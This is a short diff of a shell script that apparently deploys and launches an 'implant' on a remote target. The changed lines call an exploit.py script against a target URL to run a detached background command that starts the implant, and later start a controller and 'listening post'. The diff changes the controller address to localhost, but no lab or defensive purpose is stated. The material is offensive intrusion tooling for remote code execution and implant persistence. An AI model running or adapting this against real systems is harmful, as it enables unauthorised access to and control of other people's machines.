@@ -88,7 +88,7 @@ echo "[*] Stopping HTTP server..."
 kill $SERVER_PID 2>/dev/null || true
 
 echo "[*] Launching implant now..."
-send_cmd "cd $REMOTE_DIR && nohup ./$IMPLANT_NAME >/dev/null 2>&1 &"
+timeout 5 bash -c "python3 exploit.py 'http://${TARGET_IP}:${TARGET_PORT}/${TARGET_ENDPOINT}/' 'setsid nohup $REMOTE_IMPLANT >/dev/null 2>&1 &'" || true
 echo "[+] Implant is running."
 
 # 4. Start listening post 
@@ -107,7 +107,7 @@ if [ -n "$CONTROLLER" ]; then
     CTRL_DIR=$(dirname "$CONTROLLER")
     CTRL_FILE=$(basename "$CONTROLLER")
     echo "[*] Starting controller in $CTRL_DIR"
-    (cd "$CTRL_DIR" && python3 "$CTRL_FILE" "$LOCAL_IP" 5000)
+    (cd "$CTRL_DIR" && python3 "$CTRL_FILE" "127.0.0.1" 5000)
 fi
 
 # Wait for listening post if it was started
